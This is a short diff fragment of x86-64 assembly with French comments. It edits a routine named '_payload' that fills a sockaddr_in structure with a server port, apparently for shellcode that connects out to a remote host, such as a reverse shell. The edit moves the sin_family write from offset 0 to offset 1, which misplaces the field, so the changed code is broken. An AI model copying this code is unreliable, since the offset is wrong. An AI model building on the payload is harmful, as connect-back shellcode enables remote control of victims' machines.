@@ -69,7 +69,7 @@ _payload:
 	mov r13, rax
 
 	; Préparer la structure sockaddr_in
-    mov word [rel CONNECT_BUFFER + 0], 2              ; sin_family (AF_INET)
+    mov word [rel CONNECT_BUFFER + 1], 2              ; sin_family (AF_INET)
 
     ; Charger le port dans un registre temporaire et le déplacer dans le buffer
     movzx rax, word [rel SERVER_PORT]
